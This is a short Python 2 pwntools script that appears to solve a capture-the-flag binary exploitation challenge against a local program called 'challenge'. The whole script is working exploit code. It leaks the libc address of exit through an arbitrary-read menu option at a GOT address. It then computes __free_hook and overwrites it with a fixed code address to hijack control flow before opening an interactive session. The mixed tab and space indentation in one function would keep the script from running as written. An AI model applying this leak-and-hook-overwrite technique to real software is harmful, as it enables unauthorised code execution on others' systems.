from pwn import *

s = process("./challenge")
e = ELF("challenge")
libc = e.libc

def read_func(addr):
	s.sendlineafter("> ","1")
	s.recvuntil("Addr: ")
	s.send(str(addr))

def write_func(addr,value):
	s.sendlineafter("> ","2")
        s.recvuntil("Addr: ")
        s.send(str(addr))
	s.recvuntil("Value: ")
	s.send(str(value))

pause()

read_func(0x600ff8)

leak = u64(s.recv(6).ljust(8,"\x00")) - libc.symbols['exit']
hook = leak + libc.symbols['__free_hook']

print hex(hook)

write_func(hook,4196613)

s.interactive()
